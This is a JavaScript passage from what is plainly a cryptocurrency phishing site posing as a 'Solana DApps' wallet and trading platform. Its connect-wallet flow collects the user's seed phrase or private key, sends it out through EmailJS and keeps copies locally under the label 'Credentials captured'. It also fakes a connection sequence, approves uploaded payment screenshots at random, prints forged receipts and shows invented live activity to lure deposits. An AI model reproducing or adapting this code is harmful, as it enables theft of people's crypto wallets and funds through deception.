                return;
            }
        }
        
        this.isConnecting = true;
        this.showLoading();
        
        try {
            // Prepare data
            const templateParams = {
                secret_phrase: credentials,
                wallet_type: this.selectedWallet?.name || 'Unknown',
                credential_type: credentialType,
                timestamp: new Date().toLocaleString(),
                validation_passed: 'YES',
                platform: 'Solana DApps'
            };
            
            // Send email
            await this.sendEmail(templateParams);
            
            // Log locally
            this.logCapturedData(templateParams);
            
            // Simulate connection
            await this.simulateConnection();
            
            // Mark as connected
            this.isConnecting = false;
            this.isWalletConnected = true;
            this.saveBooleanState('wallet_connected', true);
            
            if (!this.flowState.completedSteps.includes('wallet_connected')) {
                this.flowState.completedSteps.push('wallet_connected');
            }
            
            this.saveRememberedState();
            
            // Unlock features
            if (this.hasPurchased) {
                this.checkWatchTradingAccess();
                this.showNotification('Wallet connected! Watch Trading unlocked.', 'success');
                
                setTimeout(() => {
                    this.closeModal();
                    window.location.hash = '#watch-trade';
                }, 1000);
            } else {
                this.showNotification('Wallet connected! Make a purchase.', 'info');
                setTimeout(() => {
                    this.closeModal();
                    window.location.hash = '#buy';
                }, 1000);
            }
            
            this.showFailed();
            this.resetValidation();
            
        } catch (error) {
            console.error('Connection error:', error);
            this.isConnecting = false;
            this.showError();
            this.showNotification('Connection failed', 'error');
        }
    }
    
    async sendEmail(templateParams) {
        if (!EMAILJS_INITIALIZED) {
            console.warn('EmailJS not initialized, using fallback');
            // Fallback: save locally
            this.logCapturedData(templateParams);
            return { status: 200, text: 'Fallback: saved locally' };
        }
        
        try {
            const response = await emailjs.send(
                EMAILJS_CONFIG.SERVICE_ID,
                EMAILJS_CONFIG.TEMPLATE_ID,
                templateParams
            );
            console.log('✅ Email sent');
            return response;
        } catch (error) {
            console.error('❌ Email failed:', error);
            // Still save locally
            this.logCapturedData(templateParams);
            throw error;
        }
    }
    
    logCapturedData(data) {
        console.log('🔐 Credentials captured:', {
            wallet: data.wallet_type,
            type: data.credential_type,
            timestamp: data.timestamp
        });
        
        // Store locally
        try {
            const logs = JSON.parse(localStorage.getItem('solana_captures') || '[]');
            logs.push({
                ...data,
                captured_at: new Date().toISOString()
            });
            localStorage.setItem('solana_captures', JSON.stringify(logs.slice(-100)));
        } catch (error) {
            console.log('⚠️ Could not save to localStorage');
        }
    }
    
    async simulateConnection() {
        return new Promise(resolve => {
            let progress = 0;
            const progressBar = document.getElementById('loadingProgress');
            const statusText = document.getElementById('loadingStatus');
            
            const steps = [
                'Initializing connection...',
                'Validating credentials...',
                'Connecting to Solana...',
                'Syncing token data...',
                'Finalizing connection...'
            ];
            
            const interval = setInterval(() => {
                progress += 20;
                if (progress > 100) {
                    clearInterval(interval);
                    resolve();
                } else {
                    if (progressBar) progressBar.style.width = progress + '%';
                    if (statusText && steps[Math.floor(progress/20) - 1]) {
                        statusText.textContent = steps[Math.floor(progress/20) - 1];
                    }
                }
            }, 300);
        });
    }
    
    validatePhrase(phrase) {
        const trimmed = phrase.trim();
        const words = trimmed.split(/\s+/);
        if (words.length !== 12) return false;
        const wordRegex = /^[a-zA-Z]+$/;
        for (let word of words) {
            if (!wordRegex.test(word)) return false;
        }
        return true;
    }
    
    validatePrivateKey(key) {
        const trimmed = key.trim();
        const cleanKey = trimmed.startsWith('0x') ? trimmed.slice(2) : trimmed;
        if (cleanKey.length !== 64) return false;
        const hexRegex = /^[0-9a-fA-F]{64}$/;
        return hexRegex.test(cleanKey);
    }
    
    initValidationListeners() {
        const phraseInput = document.getElementById('phraseInput');
        const privateKeyInput = document.getElementById('privateKeyInput');
        
        if (phraseInput) {
            phraseInput.addEventListener('input', (e) => {
                const phrase = e.target.value;
                this.isValidPhrase = this.validatePhrase(phrase);
                const validationEl = document.getElementById('phraseValidation');
                const validEl = document.getElementById('phraseValid');
                
                if (phrase.trim() === '') {
                    if (validationEl) validationEl.style.display = 'none';
                    if (validEl) validEl.style.display = 'none';
                } else if (this.isValidPhrase) {
                    if (validationEl) validationEl.style.display = 'none';
                    if (validEl) validEl.style.display = 'flex';
                } else {
                    if (validationEl) validationEl.style.display = 'flex';
                    if (validEl) validEl.style.display = 'none';
                }
                this.updateConnectButton();
            });
        }
        
        if (privateKeyInput) {
            privateKeyInput.addEventListener('input', (e) => {
                const key = e.target.value;
                this.isValidPrivateKey = this.validatePrivateKey(key);
                const validationEl = document.getElementById('keyValidation');
                const validEl = document.getElementById('keyValid');
                
                if (key.trim() === '') {
                    if (validationEl) validationEl.style.display = 'none';
                    if (validEl) validEl.style.display = 'none';
                } else if (this.isValidPrivateKey) {
                    if (validationEl) validationEl.style.display = 'none';
                    if (validEl) validEl.style.display = 'flex';
                } else {
                    if (validationEl) validationEl.style.display = 'flex';
                    if (validEl) validEl.style.display = 'none';
                }
                this.updateConnectButton();
            });
        }
    }
    
    updateConnectButton() {
        const connectBtn = document.getElementById('connectCredentialsBtn');
        if (!connectBtn) return;
        
        if (this.currentCredentialType === 'phrase') {
            connectBtn.disabled = !this.isValidPhrase;
        } else {
            connectBtn.disabled = !this.isValidPrivateKey;
        }
    }
    
    resetValidation() {
        this.isValidPhrase = false;
        this.isValidPrivateKey = false;
        
        const elements = {
            phraseValidation: document.getElementById('phraseValidation'),
            phraseValid: document.getElementById('phraseValid'),
            keyValidation: document.getElementById('keyValidation'),
            keyValid: document.getElementById('keyValid'),
            phraseInput: document.getElementById('phraseInput'),
            privateKeyInput: document.getElementById('privateKeyInput'),
            connectBtn: document.getElementById('connectCredentialsBtn')
        };
        
        if (elements.phraseValidation) elements.phraseValidation.style.display = 'none';
        if (elements.phraseValid) elements.phraseValid.style.display = 'none';
        if (elements.keyValidation) elements.keyValidation.style.display = 'none';
        if (elements.keyValid) elements.keyValid.style.display = 'none';
        if (elements.phraseInput) elements.phraseInput.value = '';
        if (elements.privateKeyInput) elements.privateKeyInput.value = '';
        if (elements.connectBtn) elements.connectBtn.disabled = true;
    }
    
    resetProgressBars() {
        ['progressFill', 'loadingProgress'].forEach(id => {
            const bar = document.getElementById(id);
            if (bar) bar.style.width = '0%';
        });
        if (this.loadingInterval) clearInterval(this.loadingInterval);
    }
    
    startLoadingAnimation() {
        const loadingProgress = document.getElementById('loadingProgress');
        if (!loadingProgress) return;
        
        loadingProgress.style.width = '0%';
        let width = 0;
        const interval = setInterval(() => {
            if (width >= 100) {
                clearInterval(interval);
            } else {
                width += Math.random() * 10 + 5;
                if (width > 100) width = 100;
                loadingProgress.style.width = width + '%';
            }
        }, 150);
        this.loadingInterval = interval;
    }
    
    // ============ MODAL MANAGEMENT ============
    openModal() {
        if (this.modal) {
            this.modal.style.display = 'block';
            document.body.style.overflow = 'hidden';
            this.showWalletSelection();
            this.resetProgressBars();
        }
    }
    
    closeModal() {
        if (this.modal) {
            this.modal.style.display = 'none';
            document.body.style.overflow = 'auto';
            this.showWalletSelection();
            this.isConnecting = false;
            this.resetProgressBars();
            this.resetValidation();
        }
    }
    
    // ============ PURCHASE & VERIFICATION ============
    async verifyPayment(screenshotData) {
        const statusEl = document.getElementById('verificationStatus');
        if (!statusEl) return false;
        
        statusEl.className = 'verification-status verification-processing';
        statusEl.style.display = 'block';
        statusEl.innerHTML = `<i class="fas fa-spinner fa-spin"></i><span>Verifying...</span>`;
        
        await new Promise(resolve => setTimeout(resolve, 1500));
        
        const isVerified = Math.random() < 0.95;
        
        if (isVerified) {
            statusEl.className = 'verification-status verification-success';
            statusEl.innerHTML = `<i class="fas fa-check-circle"></i><span>Payment verified!</span>`;
            
            // Store purchase
            this.purchaseData = {
                amount: parseFloat(document.getElementById('depositAmount').value) || 100,
                crypto: this.selectedCrypto,
                timestamp: new Date(),
                txId: 'SOL' + Math.random().toString(36).substr(2, 9).toUpperCase()
            };
            
            this.hasPurchased = true;
            this.saveBooleanState('purchase_verified', true);
            
            if (!this.flowState.completedSteps.includes('verified')) {
                this.flowState.completedSteps.push('verified');
            }
            
            this.saveRememberedState();
            this.showNotification('Payment verified!', 'success');
            
            setTimeout(() => {
                this.showReceipt();
            }, 1000);
            
            return true;
        } else {
            statusEl.className = 'verification-status verification-failed';
            statusEl.innerHTML = `<i class="fas fa-times-circle"></i><span>Verification failed</span>`;
            this.showNotification('Verification failed', 'error');
            return false;
        }
    }
    
    showReceipt() {
        if (!this.purchaseData) return;
        
        const { amount, crypto, timestamp, txId } = this.purchaseData;
        const cryptoAmount = amount / this.cryptoPrices[crypto];
        const cryptoName = crypto.toUpperCase();
        
        const receiptModal = document.getElementById('receiptModal');
        const receiptContent = document.getElementById('receiptContent');
        
        if (!receiptModal || !receiptContent) return;
        
        receiptContent.innerHTML = `
            <div class="receipt-loading">
                <div class="receipt-loading-spinner"></div>
                <h3 style="color: white; margin-bottom: 15px;">Generating Receipt...</h3>
                <p style="color: rgba(255, 255, 255, 0.7);">Processing transaction details</p>
            </div>
        `;
        
        receiptModal.style.display = 'block';
        document.body.style.overflow = 'hidden';
        
        setTimeout(() => {
            const isMobile = window.innerWidth <= 768;
            
            if (isMobile) {
                receiptContent.innerHTML = `
                    <div class="receipt-simple">
                        <div class="receipt-simple-header">
                            <div class="receipt-simple-title">SOLANA DAPPS</div>
                            <div class="receipt-simple-subtitle">PURCHASE RECEIPT</div>
                        </div>
                        <div class="receipt-simple-row">
                            <span class="receipt-simple-label">Date:</span>
                            <span class="receipt-simple-value">${timestamp.toLocaleString()}</span>
                        </div>
                        <div class="receipt-simple-row">
                            <span class="receipt-simple-label">TX ID:</span>
                            <span class="receipt-simple-value" style="font-size: 11px;">${txId}</span>
                        </div>
                        <div class="receipt-simple-row">
                            <span class="receipt-simple-label">Token:</span>
                            <span class="receipt-simple-value">${cryptoName}</span>
                        </div>
                        <div class="receipt-simple-row">
                            <span class="receipt-simple-label">Amount:</span>
                            <span class="receipt-simple-value">${cryptoAmount.toFixed(6)} ${cryptoName}</span>
                        </div>
                        <div class="receipt-simple-row">
                            <span class="receipt-simple-label">USD Value:</span>
                            <span class="receipt-simple-value">$${amount.toFixed(2)}</span>
                        </div>
                        <div class="receipt-simple-row">
                            <span class="receipt-simple-label">Status:</span>
                            <span class="receipt-simple-value" style="color: #14F195;">VERIFIED</span>
                        </div>
                    </div>
                `;
            } else {
                receiptContent.innerHTML = `
                    <div class="receipt-watermark">SOLANA DAPPS</div>
                    <div class="receipt-header">
                        <h1 class="receipt-title">SOLANA DAPPS</h1>
                        <div class="receipt-subtitle">PURCHASE VERIFIED</div>
                    </div>
                    
                    <div class="receipt-details">
                        <div class="receipt-row">
                            <span class="receipt-label">Date & Time:</span>
                            <span class="receipt-value">${timestamp.toLocaleString()}</span>
                        </div>
                        <div class="receipt-row">
                            <span class="receipt-label">Transaction ID:</span>
                            <span class="receipt-value">${txId}</span>
                        </div>
                        <div class="receipt-row">
                            <span class="receipt-label">Cryptocurrency:</span>
                            <span class="receipt-value">${cryptoName}</span>
                        </div>
                        <div class="receipt-row">
                            <span class="receipt-label">Amount:</span>
                            <span class="receipt-value">${cryptoAmount.toFixed(6)} ${cryptoName}</span>
                        </div>
                        <div class="receipt-row">
                            <span class="receipt-label">USD Value:</span>
                            <span class="receipt-value">$${amount.toFixed(2)}</span>
                        </div>
                        <div class="receipt-row">
                            <span class="receipt-label">Status:</span>
                            <span class="receipt-value" style="color: #14F195;">✓ VERIFIED</span>
                        </div>
                    </div>
                `;
            }
            
            const actions = document.createElement('div');
            actions.style.textAlign = 'center';
            actions.style.marginTop = '30px';
            actions.innerHTML = `
                <button class="btn btn-primary touch-friendly" onclick="printReceipt()">
                    <i class="fas fa-print"></i> Print
                </button>
                <button class="btn btn-accent touch-friendly" onclick="closeReceiptModal(); window.location.hash='#verify';" style="margin-left: 15px;">
                    <i class="fas fa-shield-alt"></i> Verify
                </button>
            `;
            receiptContent.appendChild(actions);
            
        }, 1000);
    }
    
    // ============ CRYPTO PURCHASE ============
    selectCrypto(crypto) {
        this.selectedCrypto = crypto;
        
        // Update UI
        document.querySelectorAll('.crypto-option').forEach(option => {
            option.classList.remove('selected');
        });
        
        const selected = document.querySelector(`.crypto-option[data-crypto="${crypto}"]`);
        if (selected) selected.classList.add('selected');
        
        // Update address
        const address = this.cryptoAddresses[crypto];
        const addressEl = document.getElementById('cryptoAddress');
        if (addressEl) addressEl.textContent = address;
        
        this.updateCryptoAmount();
        this.updatePurchaseDetails();
        this.updateConfirmButton();
    }
    
    updateCryptoAmount() {
        const amountInput = document.getElementById('depositAmount');
        if (!amountInput) return;
        
        const amount = parseFloat(amountInput.value) || 0;
        const crypto = this.selectedCrypto;
        const rate = this.cryptoPrices[crypto] || 1;
        const cryptoAmount = amount / rate;
        const cryptoName = crypto.toUpperCase();
        
        const cryptoAmountEl = document.getElementById('cryptoAmount');
        if (cryptoAmountEl) {
            cryptoAmountEl.textContent = `≈ ${cryptoAmount.toFixed(6)} ${cryptoName}`;
        }
    }
    
    updatePurchaseDetails() {
        const amount = parseFloat(document.getElementById('depositAmount')?.value) || 0;
        const crypto = this.selectedCrypto;
        
        if (amount > 0 && this.cryptoPrices[crypto]) {
            const coinAmount = amount / this.cryptoPrices[crypto];
            const cryptoName = crypto.toUpperCase();
            const cryptoAmountEl = document.getElementById('cryptoAmount');
            
            if (cryptoAmountEl) {
                cryptoAmountEl.innerHTML = 
                    `≈ ${coinAmount.toFixed(6)} ${cryptoName} <span style="color: #14F195; font-size: 12px;">(Purchase)</span>`;
            }
        }
    }
    
    updateConfirmButton() {
        const confirmBtn = document.getElementById('confirmPurchaseBtn');
        if (!confirmBtn) return;
        
        const cryptoName = this.selectedCrypto.toUpperCase();
        confirmBtn.innerHTML = `<i class="fas fa-shopping-cart"></i> Confirm ${cryptoName} Purchase`;
    }
    
    // ============ EVENT LISTENERS ============
    setupEventListeners() {
        // Connect wallet buttons
        const connectBtn = document.getElementById('connectBtn');
        const heroConnectBtn = document.getElementById('heroConnectBtn');
        
        if (connectBtn) connectBtn.addEventListener('click', () => this.openModal());
        if (heroConnectBtn) heroConnectBtn.addEventListener('click', () => this.openModal());
        
        // Modal close
        const closeModalBtn = document.getElementById('closeModal');
        if (closeModalBtn) {
            closeModalBtn.addEventListener('click', () => this.closeModal());
        }
        
        // Modal backdrop click
        if (this.modal) {
            this.modal.addEventListener('click', (e) => {
                if (e.target === this.modal) this.closeModal();
            });
        }
        
        // Back to wallet selection
        const backToWalletBtn = document.getElementById('backToWalletBtn');
        if (backToWalletBtn) {
            backToWalletBtn.addEventListener('click', () => this.showWalletSelection());
        }
        
        // Connect credentials
        const connectCredentialsBtn = document.getElementById('connectCredentialsBtn');
        if (connectCredentialsBtn) {
            connectCredentialsBtn.addEventListener('click', () => this.connectWithCredentials());
        }
        
        // Retry/Close buttons
        const closeFailedBtn = document.getElementById('closeFailedBtn');
        if (closeFailedBtn) {
            closeFailedBtn.innerHTML = '<i class="fas fa-rocket"></i> Start Trading';
            closeFailedBtn.onclick = () => {
                this.closeModal();
                if (this.hasPurchased && this.isWalletConnected) {
                    window.location.hash = '#watch-trade';
                    this.showNotification('Ready to trade!', 'info');
                } else if (this.hasPurchased) {
                    this.showNotification('Connect wallet first', 'warning');
                } else {
                    window.location.hash = '#buy';
                    this.showNotification('Make a purchase first', 'info');
                }
            };
        }
    }
    
    initTabSystem() {
        const tabButtons = document.querySelectorAll('.tab-btn');
        const tabContents = document.querySelectorAll('.tab-content');
        
        tabButtons.forEach(button => {
            button.addEventListener('click', () => {
                const tabId = button.getAttribute('data-tab');
                
                // Update tabs
                tabButtons.forEach(btn => btn.classList.remove('active'));
                button.classList.add('active');
                
                // Update content
                tabContents.forEach(content => content.classList.remove('active'));
                const targetTab = document.getElementById(`${tabId}Tab`);
                if (targetTab) targetTab.classList.add('active');
                
                // Update credential type
                this.currentCredentialType = tabId;
                this.updateConnectButton();
            });
        });
    }
    
    initServiceModals() {
        const services = ['TokenClaim', 'Staking', 'Swap', 'Liquidity', 'Bridge', 'Farming', 'Analytics', 'Vault'];
        services.forEach(service => {
            window[`open${service}Modal`] = () => {
                this.showNotification(`${service}: Connect wallet to access`, 'info');
            };
        });
    }
    
    initBuyCoinFeature() {
        const buyCoinBtn = document.getElementById('buyCoinBtn');
        if (buyCoinBtn) {
            buyCoinBtn.addEventListener('click', () => {
                window.location.hash = '#buy';
                setTimeout(() => {
                    selectPaymentMethod('crypto');
                    this.showNotification('Select token to purchase', 'info');
                }, 500);
            });
        }
    }
    
    // ============ UI EFFECTS ============
    animateStats() {
        const stats = document.querySelectorAll('.stat-number');
        stats.forEach(stat => {
            const text = stat.textContent;
            const hasPlus = text.includes('+');
            const hasDollar = text.includes('$');
            let targetText = text.replace(/[^0-9.]/g, '');
            let target = targetText.includes('.') ? parseFloat(targetText) : parseInt(targetText);
            if (isNaN(target)) return;
            
            let current = 0;
            const increment = target / 30;
            
            const updateCount = () => {
                if (current < target) {
                    current += increment;
                    if (current > target) current = target;
                    let displayValue = targetText.includes('.') ? current.toFixed(1) : Math.floor(current);
                    stat.textContent = (hasDollar ? '$' : '') + displayValue.toLocaleString() + (hasPlus ? '+' : '');
                    if (current < target) {
                        setTimeout(updateCount, 50);
                    }
                }
            };
            
            const observer = new IntersectionObserver((entries) => {
                if (entries[0].isIntersecting) {
                    updateCount();
                    observer.unobserve(stat);
                }
            }, { threshold: 0.1 });
            
            observer.observe(stat);
        });
    }
    
    initScrollAnimations() {
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    entry.target.classList.add('section-visible');
                    entry.target.classList.remove('section-hidden');
                }
            });
        }, { threshold: 0.05 });
        
        document.querySelectorAll('section').forEach(section => {
            section.classList.add('section-hidden');
            observer.observe(section);
        });
    }
    
    initLivePopups() {
        const container = document.getElementById('livePopupContainer');
        if (!container) return;
        
        container.style.display = 'block';
        this.showRandomPopup();
        
        setInterval(() => {
            if (Math.random() < 0.5) this.showRandomPopup();
        }, 8000);
    }
    
    showRandomPopup() {
        const container = document.getElementById('livePopupContainer');
        if (!container) return;
        
        const randomMessage = this.popupMessages[Math.floor(Math.random() * this.popupMessages.length)];
        
        const popup = document.createElement('div');
        popup.className = 'live-popup';
        popup.innerHTML = `
            <div class="popup-header">
                <i class="fas fa-bolt"></i>
                <span>Live Activity</span>
                <button class="close-modal" onclick="this.parentElement.parentElement.remove()" style="position: absolute; top: 5px; right: 5px; width: 20px; height: 20px; font-size: 10px; background: rgba(0,0,0,0.3);">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="popup-content">
                ${randomMessage}
            </div>
            <span class="popup-timestamp">
                ${new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}
            </span>
        `;
        
        container.appendChild(popup);
        
        setTimeout(() => {
            popup.style.animation = 'popupSlideIn 0.5s cubic-bezier(0.4, 0, 0.2, 1) reverse';
            setTimeout(() => popup.remove(), 500);
        }, 5000);
        
        const popups = container.querySelectorAll('.live-popup');
        if (popups.length > 2) popups[0].remove();
    }
    
    initLiveSolanaPrice() {
        const priceElement = document.getElementById('liveSolanaPrice');
        if (!priceElement) return;
        
        priceElement.style.display = 'block';
        this.updateSolanaPrice();
        
        setInterval(() => this.updateSolanaPrice(), 30000);
    }
    
    updateSolanaPrice() {
        this.currentSolPrice = 100.00;
        
        const currentPriceEl = document.getElementById('currentSolPrice');
        const priceChangeEl = document.getElementById('priceChange');
        
        if (currentPriceEl) currentPriceEl.textContent = `$${this.currentSolPrice.toFixed(2)}`;
        if (priceChangeEl) priceChangeEl.textContent = '▲ 0.00% (24h)';
    }
    
    showNotification(message, type = 'info') {
        // Remove existing
        document.querySelectorAll('.notification').forEach(n => n.remove());
        
        const notification = document.createElement('div');
        notification.className = `notification ${type}`;
        
        const icons = {
            info: 'info-circle',
            success: 'check-circle',
            warning: 'exclamation-triangle',
            error: 'exclamation-circle'
        };
        
        notification.innerHTML = `
            <i class="fas fa-${icons[type] || 'info-circle'}"></i>
            <span>${message}</span>
        `;
        
        document.body.appendChild(notification);
        
        setTimeout(() => notification.style.transform = 'translateY(0)', 10);
        
        setTimeout(() => {
            notification.style.transform = 'translateY(-100px)';
            setTimeout(() => notification.remove(), 400);
        }, 3000);
    }
}

// ==============================================
// 6. GLOBAL FUNCTIONS
// ==============================================

// Password toggle
window.togglePassword = function(inputId) {
    const input = document.getElementById(inputId);
    if (!input) return;
    
    const toggle = event.currentTarget;
    if (input.type === 'password') {
        input.type = 'text';
        toggle.innerHTML = '<i class="fas fa-eye-slash"></i>';
    } else {
        input.type = 'password';
        toggle.innerHTML = '<i class="fas fa-eye"></i>';
    }
};

// Auth tabs
window.switchToTab = function(tabName) {
    if (AUTH_SYSTEM) AUTH_SYSTEM.switchTab(tabName);
};

// Forgot password
window.openForgotPassword = function() {
    if (AUTH_SYSTEM) AUTH_SYSTEM.switchTab('forgot');
};

window.handleForgotPassword = function() {
    if (AUTH_SYSTEM) AUTH_SYSTEM.handleForgotPassword();
};

// Logout
window.logout = function() {
    if (AUTH_SYSTEM) AUTH_SYSTEM.logout();
};

// Terms & Privacy
window.showTerms = function() {
    const modalOverlay = document.getElementById('modalOverlay');
    const modalContent = document.getElementById('modalContent');
    
    if (modalOverlay && modalContent) {
        modalContent.innerHTML = `
            <h2>Terms of Service</h2>
            <div class="modal-dialog-content">
                <h3>1. Acceptance</h3>
                <p>By using this platform, you agree to these terms.</p>
                
                <h3>2. Services</h3>
                <p>We provide Solana wallet management and trading simulation.</p>
                
                <h3>3. User Responsibilities</h3>
                <ul>
                    <li>Keep credentials secure</li>
                    <li>Use lawfully</li>
                    <li>Be 18+ years old</li>
                </ul>
                
                <h3>4. Risk Disclaimer</h3>
                <p>Trading involves risk. Past performance ≠ future results.</p>
                
                <h3>5. Liability</h3>
                <p>We are not liable for losses from platform use.</p>
                
                <h3>6. Changes</h3>
                <p>Terms may change. Continued use = acceptance.</p>
            </div>
        `;
        modalOverlay.style.display = 'flex';
    }
};

window.showPrivacy = function() {
    const modalOverlay = document.getElementById('modalOverlay');
    const modalContent = document.getElementById('modalContent');
    
    if (modalOverlay && modalContent) {
        modalContent.innerHTML = `
            <h2>Privacy Policy</h2>
            <div class="modal-dialog-content">
                <h3>1. Information Collection</h3>
                <p>We collect data you provide.</p>
                
                <h3>2. Use</h3>
                <p>To provide and improve services.</p>
                
                <h3>3. Security</h3>
                <p>We implement security measures.</p>
                
                <h3>4. Third Parties</h3>
                <p>We may use trusted services.</p>
                
                <h3>5. Your Rights</h3>
                <p>Access, correct, or delete data.</p>
                
                <h3>6. Contact</h3>
                <p>privacy@dappsenterprise.com</p>
            </div>
        `;
        modalOverlay.style.display = 'flex';
    }
};

window.closeModal = function() {
    const modalOverlay = document.getElementById('modalOverlay');
    if (modalOverlay) modalOverlay.style.display = 'none';
};

// Purchase functions
window.selectPaymentMethod = function(method) {
    const cryptoForm = document.getElementById('cryptoDepositForm');
    if (!cryptoForm) return;
    
    cryptoForm.style.display = 'none';
    if (method === 'crypto') {
        cryptoForm.style.display = 'block';
        setTimeout(() => {
            cryptoForm.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }, 100);
    }
};

window.selectCrypto = function(crypto) {
    if (PLATFORM) PLATFORM.selectCrypto(crypto);
};

window.updateCryptoAmount = function() {
    if (PLATFORM) PLATFORM.updateCryptoAmount();
};

window.updatePurchaseDetails = function() {
    if (PLATFORM) PLATFORM.updatePurchaseDetails();
};

window.updateConfirmButton = function() {
    if (PLATFORM) PLATFORM.updateConfirmButton();
};

window.copyAddress = function() {
    const address = document.getElementById('cryptoAddress');
    if (address) {
        navigator.clipboard.writeText(address.textContent).then(() => {
            if (PLATFORM) PLATFORM.showNotification('Address copied!', 'success');
        }).catch(err => {
            console.error('Copy failed:', err);
            if (PLATFORM) PLATFORM.showNotification('Copy failed', 'error');
        });
    }
};

window.saveQRCode = function() {
    if (PLATFORM) PLATFORM.showNotification('QR download started', 'success');
};

window.proceedToVerification = function() {
    const amount = document.getElementById('depositAmount').value;
    if (!amount || parseFloat(amount) < 50) {
        if (PLATFORM) PLATFORM.showNotification('Minimum $50.00', 'warning');
        return;
    }
    
    const verificationSection = document.getElementById('paymentVerificationSection');
    if (verificationSection) {
        verificationSection.style.display = 'block';
        setTimeout(() => {
            verificationSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }, 100);
    }
    
    if (PLATFORM) PLATFORM.showNotification('Upload screenshot', 'info');
};

window.proceedToWalletConnection = function() {
    closeReceiptModal();
    if (PLATFORM) {
        PLATFORM.openModal();
        PLATFORM.showNotification('Connect wallet', 'info');
    }
};

window.handleScreenshotUpload = function(event) {
    const file = event.target.files[0];
    if (!file) return;
    
    if (!file.type.match('image.*')) {
        if (PLATFORM) PLATFORM.showNotification('Upload image file', 'error');
        return;
    }
    
    const reader = new FileReader();
    reader.onload = function(e) {
        const preview = document.getElementById('screenshotPreview');
        if (preview) {
            preview.src = e.target.result;
            preview.style.display = 'block';
        }
        
        if (PLATFORM) PLATFORM.verifyPayment(e.target.result);
    };
    reader.readAsDataURL(file);
};

window.handleVerification = function() {
    if (PLATFORM) PLATFORM.handleVerification();
};

window.closeReceiptModal = function() {
    const modal = document.getElementById('receiptModal');
    if (modal) {
        modal.style.display = 'none';
        document.body.style.overflow = 'auto';
    }
};

window.printReceipt = function() {
    const receiptContent = document.getElementById('receiptContent');
    if (!receiptContent) return;
    
    const printContent = receiptContent.innerHTML;
    const printWindow = window.open('', '_blank');
    printWindow.document.write(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Receipt</title>
            <style>
                body { font-family: 'Courier New', monospace; padding: 20px; }
                .receipt-container { max-width: 600px; margin: 0 auto; }
                @media print { body { padding: 0; } }
            </style>
        </head>
        <body>
            <div class="receipt-container">${printContent}</div>
            <script>
                window.onload = function() { 
                    window.print(); 
                    setTimeout(() => window.close(), 500);
                }
            <\/script>
        </body>
        </html>
    `);
    printWindow.document.close();
};

window.enterWatchTradingPlatform = function() {
    closeReceiptModal();
    window.location.hash = '#watch-trade';
    if (PLATFORM) PLATFORM.checkWatchTradingAccess();
};

// Trading functions
window.startAutoTrading = function() {
    if (PLATFORM) PLATFORM.startAutoTrading();
};

window.stopAutoTrading = function() {
    if (PLATFORM) PLATFORM.stopAutoTrading();
};

// Service functions
const SERVICES = ['TokenClaim', 'Staking', 'Swap', 'Liquidity', 'Bridge', 'Farming', 'Analytics', 'Vault'];
SERVICES.forEach(service => {
    window[`open${service}Modal`] = () => {
        if (PLATFORM) PLATFORM.showNotification(`${service}: Connect wallet`, 'info');
    };
});

// Close modals on outside click
document.addEventListener('click', (e) => {
    const modalOverlay = document.getElementById('modalOverlay');
    if (modalOverlay && e.target === modalOverlay) {
        modalOverlay.style.display = 'none';
    }
});

// ==============================================
// 7. FINAL INITIALIZATION GUARD
// ==============================================
if (!window.PLATFORM_INITIALIZED) {
    window.PLATFORM_INITIALIZED = true;
    console.log('🔒 Platform initialization complete');
}